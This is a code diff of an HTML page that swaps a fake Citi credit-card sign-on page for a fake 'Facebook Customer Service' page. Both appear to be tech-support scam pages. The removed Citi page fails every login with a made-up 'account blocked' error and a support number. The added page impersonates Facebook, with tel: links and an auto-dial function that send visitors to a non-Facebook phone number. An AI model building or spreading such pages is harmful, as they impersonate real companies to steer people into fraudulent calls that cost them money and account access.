@@ -1,278 +1,95 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
+
+
+
 <head>
-    <script defer data-domain="citionline.vercel.app" src="https://plausible.io/js/script.js"></script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Citi Credit Cards</title>
-    <link rel="stylesheet" href="styles.css">
-    <style>
-        /* General Reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-QMN6095HRW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-        /* Basic Styling */
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            padding: 20px;
-        }
+  gtag('config', 'G-QMN6095HRW');
+</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Customer Service</title>
+  <style>
+    body {
+      font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+      text-align: center;
+      padding: 20px;
+      background-color: #f5f5f7;
+    }
 
-        .navbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background-color: #fff;
-            padding: 10px 20px;
-            border-bottom: 1px solid #ccc;
-        }
+    h1 {
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
 
-        .navbar img {
-            height: 30px;
-        }
+    p {
+      font-size: 18px;
+      line-height: 1.5;
+      margin-bottom: 30px;
+    }
 
-        .navbar .search-bar {
-            display: flex;
-            align-items: center;
-            background-color: #f4f4f4;
-            border-radius: 5px;
-            padding: 5px 10px;
-            flex: 1;
-            margin-left: 10px;
-        }
+    .call-button {
+      display: inline-block;
+      background-color: #0000FF;
+      color: #fff;
+      padding: 15px 30px;
+      font-size: 24px;
+      border-radius: 5px;
+      text-decoration: none;
+      transition: background-color 0.3s ease;
+      margin-bottom: 20px;
+    }
 
-        .navbar .search-bar input {
-            border: none;
-            outline: none;
-            background: transparent;
-            flex: 1;
-            margin-left: 5px;
-        }
+    .call-button:hover {
+      background-color: #b71b36;
+    }
 
-        .navbar .close-btn {
-            font-size: 1.5em;
-            cursor: pointer;
-        }
+    .apple-logo {
+      width: 150px;
+      height: 150px;
+      margin-bottom: 30px;
+    }
 
-        .login-section-wrapper {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            margin-top: 20px;
-            position: relative;
-        }
+    .footer {
+      font-size: 14px;
+      color: #888;
+      margin-top: 50px;
+    }
+  </style>
+  <script>
+    function autoDial() {
+      var phoneNumber = "+1-818-463-0752";
+      window.location.href = "tel:" + phoneNumber;
+    }
 
-        .input-group {
-            margin-bottom: 15px;
-            position: relative;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            font-size: 1em;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        .input-group .toggle-password {
-            position: absolute;
-            top: 50%;
-            right: 10px;
-            transform: translateY(-50%);
-            cursor: pointer;
-        }
-
-        .sign-on-button {
-            background-color: #0072ce;
-            color: #fff;
-            padding: 12px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1em;
-            width: 100%;
-        }
-
-        .error-message {
-            color: red;
-            display: none;
-            margin-top: 10px;
-            text-align: left;
-        }
-
-        .info-message {
-            background-color: #f1f1f1;
-            border-left: 4px solid #0072ce;
-            padding: 10px;
-            margin-top: 10px;
-            display: none;
-            font-size: 0.9em;
-        }
-
-        .spinner {
-            display: none;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 50px;
-            height: 50px;
-            border: 5px solid #ccc;
-            border-top-color: #0072ce;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .login-options {
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .login-options a {
-            color: #0072ce;
-            text-decoration: none;
-            font-size: 0.9em;
-            margin: 0 5px;
-        }
-
-        .mobile-app-banner {
-            background-color: #f9f9f9;
-            padding: 10px;
-            border-radius: 5px;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .mobile-app-banner img {
-            width: 20px;
-            vertical-align: middle;
-            margin-right: 5px;
-        }
-
-        /* Mobile Styles */
-        @media (max-width: 767px) {
-            .navbar .search-bar {
-                flex: none;
-                width: calc(100% - 60px);
-            }
-
-            .login-options {
-                display: flex;
-                justify-content: space-around;
-                flex-wrap: wrap;
-            }
-        }
-    </style>
+    function call() {
+      // Implement the call functionality here, such as initiating a phone call.
+      console.log("Calling...");
+    }
+  </script>
 </head>
-<body>
-    <header>
-        <div class="navbar">
-            <img src="citi-logo.png" alt="Citi Logo">
-            <div class="search-bar">
-                <input type="text" placeholder="How can we help?">
-            </div>
-            <div class="close-btn">×</div>
-        </div>
-    </header>
 
-    <div class="login-section-wrapper">
-        <div class="spinner" id="spinner"></div>
-        <form id="loginForm">
-            <div class="error-message" id="error-message">
-                <p>Error Code : 0X0X0027384 <br> Your account has been blocked due to some suspicious login attempts. <br> Contact Support : <a href="tel:18664098850">+1-866-409-8850</a></p>
-            </div>
-            <div class="info-message" id="info-message">
-                <p>If you're using auto-fill to sign on, make sure you have saved the correct sign-on information on your browser.</p>
-            </div>
-            <br> <div class="input-group">
-                <label for="userID">User ID</label>
-                <input type="text" id="userID" placeholder="User ID">
-            </div>
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Password">
-                <div class="toggle-password">👁️</div>
-            </div>
-            <div>
-                <input type="checkbox" id="remember">
-                <label for="remember">Remember User ID</label>
-            </div>
-            <br> <button type="submit" class="sign-on-button">Sign On</button>
-        </form>
-        <div class="login-options">
-            <a href="#">Forgot User ID</a>
-            <a href="#">Forgot Password</a>
-        </div>
-        <div class="login-options">
-            <a href="#">Register for Online Access</a>
-            <a href="#">Activate a Card</a>
-        </div>
-    </div>
+<body >
 
-    <div class="mobile-app-banner">
-        <img src="citi new.png" alt="Citi Mobile">
-        Use the Citi Mobile® App
-    </div>
+  
+<img src="facebook.png" alt="Apple Logo" class="apple-logo">
+  <h1>Facebook Customer Service</h1>
+  <p>For any assistance or inquiries related to Facebook products or services, our dedicated customer service team is here to help you. Whether you need technical support, have questions about your Facebook device, require assistance with your Facebook account, or need guidance with Facebook services, our experts are just a phone call away. Experience exceptional support from Facebook.</p>
+  <a href="tel:+1-818-463-0752" class="call-button">Call Us Now</a>
+<br>
+  <a href="tel:+1-818-463-0752" class="call-button">+1-818-463-0752</a>
+  <p class="footer">© 2023 Facebook Inc. All rights reserved.</p>
 
-    <script>
-        // Toggle password visibility
-        document.querySelector('.toggle-password').addEventListener('click', function () {
-            const passwordField = document.getElementById('password');
-            if (passwordField.type === 'password') {
-                passwordField.type = 'text';
-            } else {
-                passwordField.type = 'password';
-            }
-        });
-
-        // Handle form submission
-        document.getElementById("loginForm").addEventListener("submit", function (event) {
-            event.preventDefault();
-
-            const userID = document.getElementById("userID").value;
-            const password = document.getElementById("password").value;
-            const errorMessage = document.getElementById("error-message");
-            const infoMessage = document.getElementById("info-message");
-            const spinner = document.getElementById("spinner");
-
-            // Show spinner
-            spinner.style.display = "block";
-
-            // Simulate a delay to display the error message
-            setTimeout(function () {
-                // Hide spinner
-                spinner.style.display = "none";
-
-                // Show error message if user ID or password is incorrect
-                if (userID === "" || password === "" || userID !== "admin" || password !== "1234") {
-                    errorMessage.style.display = "block";
-                    infoMessage.style.display = "block";
-                } else {
-                    errorMessage.style.display = "none";
-                    infoMessage.style.display = "none";
-                    alert("Login successful! Redirecting...");
-                }
-            }, 3000); // 3-second delay
-        });
-    </script>
 </body>
+
+
+
 </html>
